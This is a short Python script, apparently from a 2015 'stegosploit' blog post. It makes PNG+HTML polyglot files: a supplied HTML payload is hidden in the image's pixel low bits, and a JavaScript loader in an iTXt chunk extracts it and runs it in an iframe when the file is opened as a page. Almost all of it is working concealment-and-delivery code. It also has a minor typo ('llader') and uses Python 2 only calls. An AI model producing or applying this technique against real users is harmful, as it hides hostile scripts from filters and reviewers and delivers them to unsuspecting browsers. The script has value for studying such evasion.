# Simple script to have fun with PNG+HTML polyglot
# WARNING: This script is not optimised and just written for fun
#
# Author : Bharadwaj Machiraju
#
# Requirements: Pillow
#
# http://blog.tunnelshade.in/2015/06/stegosploit-fun.html

import re
import sys
import struct
import argparse
import binascii

parser = argparse.ArgumentParser(description='Do some simple magic with PNG and not all PNG files are supported')
parser.add_argument('-i', dest='inp', required=True, help='path of the input PNG file')
parser.add_argument('-p', dest='payload', required=True, help='path of a payload HTML file')
parser.add_argument('-o', dest='out', required=True, help='path for output polyglot')

args = parser.parse_args()

from PIL import Image

print("[*] Opening payload and converting to bit string")
payload = open(args.payload, 'r').read().encode('hex')
bin_payload = "".join('{:04b}'.format(int(c, 16)) for c in payload)

im = Image.open(args.inp).convert('RGBA')
pixels = im.load()
size = im.size[0]*im.size[1]

if len(bin_payload) > 3*size:
    print("[*] Sorry, get a higher resolution image")
    sys.exit()

def change_lsb():
    index = 0
    for j in range(0, im.size[1]):
        for i in range(0, im.size[0]):
            temp_list = list(pixels[i, j])
            for k in [0, 1, 2]:
                temp_list[k] = ((pixels[i, j][k] & ~(1)) | (int(bin_payload[index])))
                index += 1
                pixels[i, j] = tuple(temp_list)
                if index == len(bin_payload): return

print("[*] Hiding data in LSB")
change_lsb()
print("[*] Saving intermediate PNG")
im.save("intermediate.png")

# Creating final PNG

print("[*] Opening intermediate png for adding loader")
hex_content = binascii.hexlify(open('intermediate.png', 'rb').read())
hex_array = [hex_content[i:i+2] for i in range(0, len(hex_content), 2)]
o = open(args.out, 'wb')

# PNG Header
print("[*] Writing PNG header")
o.write(binascii.unhexlify(''.join(hex_array[0:8])))

print("[*] Writing IHDR chunk")
ihdr_length = (4 + 4 + int(''.join(hex_array[8:12]), 16) + 4)
o.write(binascii.unhexlify(''.join(hex_array[8:8 + ihdr_length])))

loader = """
<html>
<head>
<style>
    body { visibility:hidden; }
    .n { visibility:visible; position:absolute; padding: 0; margin: 0; top: 0; left: 0; }
</style>
<script>
function unhide() {
    var l = """ + str(len(bin_payload)) + """;
    var bs = '';
    var j = 0;
    var srcImg = document.getElementById('srcImg');
    var canvas = document.createElement('canvas');
    canvas.width = srcImg.width;
    canvas.height = srcImg.height;
    var ctx = canvas.getContext('2d');
    ctx.drawImage(srcImg, 0, 0, srcImg.width, srcImg.height);
    var imgData = ctx.getImageData(0,0,srcImg.width,srcImg.height);
    if (l < imgData.data.length) {
        for(var i=0; j<l; i+=1) {
            if (i%4 != 3) {
                bs += (imgData.data[i]%2).toString();
                j += 1;
            }
        }
    }
    var p = bs.replace(/[01]{8}/g, function(v) {
        return String.fromCharCode(parseInt(v,2));
    });
    var f = document.createElement('iframe');
    f.srcdoc = p;
    document.body.appendChild(f);
}
</script>
</head>
<body>
<img class='n' id='srcImg' src='#' onload='unhide();'/><!--
"""
print("[*] Minifying loader html")
loader = re.sub("\n[\s]*", '', loader)
loader = re.sub("[\s]*=[\s]*", '=', loader)
loader = re.sub("[\s]*}[\s]*", '}', loader)
llader = re.sub("[\s]*{[\s]*", '{', loader)

print("[*] Writing iTXt chunk containing loader")
itxt_content_length = struct.pack(">i", len(loader)).encode('hex')
itxt_content = 'iTXt'.encode('hex') + loader.encode('hex')
itxt_crc = struct.pack(">i", binascii.crc32(itxt_content)).encode('hex')
o.write(binascii.unhexlify(itxt_content_length + itxt_content + itxt_crc))


print("[*] Writing the remaining data")
o.write(binascii.unhexlify(''.join(hex_array[8 + ihdr_length:])))

o.close()
